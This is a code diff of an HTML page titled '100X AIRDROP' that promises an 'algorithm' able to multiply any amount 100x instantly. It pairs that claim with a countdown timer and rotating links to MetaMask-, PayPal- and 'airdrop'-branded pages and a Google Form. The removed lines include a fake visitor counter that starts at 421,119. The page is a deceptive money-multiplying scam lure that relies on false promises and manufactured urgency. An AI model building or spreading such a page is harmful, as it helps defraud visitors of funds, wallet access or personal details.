@@ -1,200 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>100X AIRDROP</title>
+    <style>
+        /* Full Page Styling */
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: black;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+        }
 
-<!DOCTYPE html>  
-<html lang="en">  
-<head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>100X AIRDROP</title>  
-    <style>  
-        /* Full Page Styling */  
-        body {  
-            margin: 0;  
-            overflow: hidden;  
-            background-color: black;  
-            position: relative;  
-            display: flex;  
-            flex-direction: column;  
-            align-items: center;  
-            justify-content: flex-start;  
-            height: 100vh;  
-        }  
+        /* Neon Border */
+        .border {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: 10px solid #00faff;
+            box-shadow: 0 0 40px #00faff;
+            border-radius: 25px;
+            pointer-events: none;
+        }
 
-        /* Neon Blue Border */  
-        .border {  
-            position: absolute;  
-            top: 0;  
-            left: 0;  
-            width: 100vw;  
-            height: 100vh;  
-            border: 10px solid #00f;  
-            box-shadow: 0 0 20px #00f;  
-            border-radius: 15px;  
-            pointer-events: none;  
-        }  
+        /* Countdown Timer */
+        .countdown-container {
+            margin-top: 20px;
+            color: darkblue;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px white;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 10px 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px white;
+            border: 2px solid darkblue;
+            text-align: center;
+        }
 
-        /* Countdown Timer */  
-        .countdown-container {  
-            margin-top: 20px;  
-            color: darkblue;  
-            font-size: 1.2rem;  
-            font-weight: bold;  
-            text-shadow: 0 0 10px white;  
-            background: rgba(255, 255, 255, 0.9);  
-            padding: 10px 20px;  
-            border-radius: 8px;  
-            box-shadow: 0 0 10px white;  
-            border: 2px solid darkblue;  
-            text-align: center; /* Center the timer text */  
-        }  
+        /* Title GIF */
+        .title-gif {
+            margin-top: 20px;
+            max-width: 250px;
+        }
 
-        /* Centered Title GIF - Moved Down */  
-        .title-gif {  
-            margin-top: 60px; /* Moved further down */  
-            max-width: 250px;  
-        }  
+        /* Scrolling GIFs Container */
+        .gif-container {
+            position: relative;
+            width: 100%;
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
 
-        /* Free Airdrop GIF (Below Title) */  
-        .free-airdrop {  
-            margin-top: 20px;  
-            max-width: 300px;  
-        }  
+        /* Individual GIFs */
+        .gif-container img {
+            max-width: 400px;
+            position: absolute;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
 
-        /* Scrolling GIFs Container */  
-        .gif-container {  
-            position: relative;  
-            width: 100%;  
-            height: 250px; /* Adjust height for large GIFs */  
-            display: flex;  
-            align-items: center;  
-            justify-content: center;  
-            overflow: hidden;  
-            /* Removed margin-top to prevent contact with timer */  
-        }  
+        /* First GIF visible initially */
+        .gif-container img:first-child {
+            opacity: 1;
+        }
 
-        /* Individual GIFs */  
-        .gif-container img {  
-            max-width: 400px; /* Extra Large */  
-            display: none;  
-            transition: opacity 0.5s ease-in-out;  
-        }  
+        /* Floating Elements (Emojis & Images) */
+        .floating {
+            position: absolute;
+            font-size: 2rem;
+            user-select: none;
+            pointer-events: none;
+            animation: fall linear infinite;
+        }
 
-        /* Floating Emojis */  
-        .emoji {  
-            position: absolute;  
-            font-size: 2rem;  
-            user-select: none;  
-            pointer-events: none;  
-            animation: fall linear infinite;  
-        }  
+        @keyframes fall {
+            from { transform: translateY(-100%); opacity: 1; }
+            to { transform: translateY(100vh); opacity: 0; }
+        }
 
-        @keyframes fall {  
-            from { transform: translateY(-100%); opacity: 1; }  
-            to { transform: translateY(100vh); opacity: 0; }  
-        }  
+        /* Floating Images */
+        .floating-img {
+            position: absolute;
+            max-width: 80px;
+            user-select: none;
+            pointer-events: none;
+            animation: fall linear infinite;
+        }
 
-        /* Hit Counter */  
-        .hit-counter {  
-            position: absolute;  
-            bottom: 20px;  
-            font-size: 1.5rem;  
-            color: #00f;  
-            text-shadow: 0 0 10px #00f;  
-            background: rgba(0, 0, 0, 0.7);  
-            padding: 8px 20px;  
-            border-radius: 8px;  
-            border: 2px solid #00f;  
-        }  
-    </style>  
-</head>  
-<body>  
+    </style>
+</head>
+<body>
 
-    <!-- Neon Border -->  
-    <div class="border"></div>  
+    <!-- Neon Border -->
+    <div class="border"></div>
 
-    <!-- Countdown Timer (Above Title GIF) -->  
-    <div class="countdown-container">  
-        <strong>GHX-T ALGORITHM ™️©️ MULTIPLY ANY AMOUNT  INSTANTLY 100X LIMITED TIME OFFER</strong><br>  
-        <span id="timer"></span>  
-    </div>  
+    <!-- Countdown Timer -->
+    <div class="countdown-container">
+        <strong>GHX-T ALGORITHM ™️©️ MULTIPLY ANY AMOUNT  INSTANTLY 100X LIMITED TIME OFFER</strong><br>
+        <span id="timer"></span>
+    </div>
 
-    <!-- Title GIF (Moved Down) -->  
-    <img src="xx.gif" alt="100X Airdrop" class="title-gif">  
+    <!-- Title GIF -->
+    <img src="xx.gif" alt="100X Airdrop" class="title-gif">
 
-    <!-- Free Airdrop GIF Below Title -->  
-    <img src="freeairdrop.gif" alt="Free Airdrop" class="free-airdrop">  
+    <!-- Scrolling GIFs -->
+    <div class="gif-container">
+        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="metamask.gif" alt="MetaMask"></a>
+        <a href="https://fclmail.github.io/PAYPAL/"><img src="paypal.gif" alt="PayPal"></a>
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform"><img src="airdrop.gif" alt="Airdrop"></a>
+        <a href="https://google.ca"><img src="multiply.gif" alt="Multiply"></a>
+        <a href="https://google.ca"><img src="limitedtimeoffer.gif" alt="Limited Time Offer"></a>
+    </div>
 
-    <!-- Scrolling Clickable GIFs -->  
-    <div class="gif-container">  
-        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="metamask.gif" alt="MetaMask"></a>  
-        <a href="https://fclmail.github.io/PAYPAL/"><img src="paypal.gif" alt="PayPal"></a>  
-        <a href="           
-https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform
-                 "><img src="airdrop.gif" alt="Airdrop"></a>  
-        <a href="https://google.ca"><img src="multiply.gif" alt="Multiply"></a>  
-        <a href="https://google.ca"><img src="limitedtimeoffer.gif" alt="Limited Time Offer"></a>  
-    </div>  
+    <script>
+        // Countdown Timer to March 31, 2025
+        function updateTimer() {
+            const targetDate = new Date("March 31, 2025 00:00:00").getTime();
+            setInterval(() => {
+                const now = new Date().getTime();
+                const timeLeft = targetDate - now;
 
-    <!-- Hit Counter -->  
-    <div class="hit-counter">  
-        Visitors: <span id="hit-count">421,119</span>  
-    </div>  
+                if (timeLeft < 0) {
+                    document.getElementById("timer").innerHTML = "EXPIRED!";
+                    return;
+                }
 
-    <script>  
-        // Countdown Timer to March 31, 2025  
-        function updateTimer() {  
-            const targetDate = new Date("March 31, 2025 00:00:00").getTime();  
-            setInterval(() => {  
-                const now = new Date().getTime();  
-                const timeLeft = targetDate - now;  
-
-                if (timeLeft < 0) {  
-                    document.getElementById("timer").innerHTML = "EXPIRED!";  
-                    return;  
-                }  
-
-                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));  
-                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));  
-                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));  
-                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);  
-                const milliseconds = Math.floor((timeLeft % 1000));  
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                const milliseconds = Math.floor((timeLeft % 1000));
 
                 document.getElementById("timer").innerHTML =  
                     `${days}d ${hours}h ${minutes}m ${seconds}s ${milliseconds}ms`;  
-            }, 50);  
-        }  
-        updateTimer();  
+            }, 50);
+        }
+        updateTimer();
 
-        // Scrolling GIFs Logic  
-        let currentGif = 0;  
-        const gifs = document.querySelectorAll(".gif-container img");  
+        // Scrolling GIFs Logic
+        let currentGif = 0;
+        const gifs = document.querySelectorAll(".gif-container img");
 
-        function showNextGif() {  
-            gifs.forEach(gif => gif.style.display = "none"); // Hide all GIFs  
-            gifs[currentGif].style.display = "block"; // Show current GIF  
-            currentGif = (currentGif + 1) % gifs.length; // Move to next GIF  
-        }  
-        showNextGif(); // Show first GIF  
-        setInterval(showNextGif, 4000); // Rotate GIFs every 2 seconds  
+        function showNextGif() {
+            gifs.forEach((gif, index) => {
+                gif.style.opacity = index === currentGif ? "1" : "0";
+            });
 
-        // Floating Emojis  
-        const emojis = ["😀", "😄", "😊", "😃", "💵", "💵", "💰", "🎁", "🪂", "🎁", "🪂", "🪂", "⛽", "⛽"];  
-        function createEmoji() {  
-            const emoji = document.createElement("div");  
-            emoji.classList.add("emoji");  
-            emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];  
-            emoji.style.left = Math.random() * 100 + "vw";  
-            emoji.style.animationDuration = (Math.random() * 3 + 2) + "s";  
-            document.body.appendChild(emoji);  
-            setTimeout(() => emoji.remove(), 4000);  
-        }  
-        setInterval(createEmoji, 300);  
+            currentGif = (currentGif + 1) % gifs.length; // Move to next GIF
+        }
 
-        // Hit Counter (Increments on Refresh)  
-        let count = localStorage.getItem("hitCount") ? parseInt(localStorage.getItem("hitCount")) : 421119;  
-        count++;  
-        document.getElementById("hit-count").innerText = count;  
-        localStorage.setItem("hitCount", count);  
-    </script>  
+        setInterval(showNextGif, 4000); // Rotate GIFs every 4 seconds
 
-</body>  
+        // Floating Emojis & Images
+        const emojis = ["😃", "😀", "😄", "💵", "💰", "🎁", "🪂", "⛽"];
+        const images = ["yy.gif", "zz.png", "aa.png"];
+
+        function createFloatingElement(type) {
+            const element = document.createElement("div");
+            element.classList.add("floating");
+
+            if (type === "emoji") {
+                element.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                element.style.fontSize = Math.random() * 1.5 + 1.5 + "rem";
+            } else {
+                element.classList.add("floating-img");
+                const img = document.createElement("img");
+                img.src = images[Math.floor(Math.random() * images.length)];
+                img.style.width = Math.random() * 50 + 50 + "px"; // Random size
+                element.appendChild(img);
+            }
+
+            element.style.left = Math.random() * 100 + "vw";
+            element.style.animationDuration = (Math.random() * 3 + 2) + "s";
+            document.body.appendChild(element);
+            setTimeout(() => element.remove(), 4000);
+        }
+
+        // Generate floating elements
+        setInterval(() => createFloatingElement("emoji"), 500);
+        setInterval(() => createFloatingElement("image"), 2000);
+
+    </script>
+
+</body>
 </html>
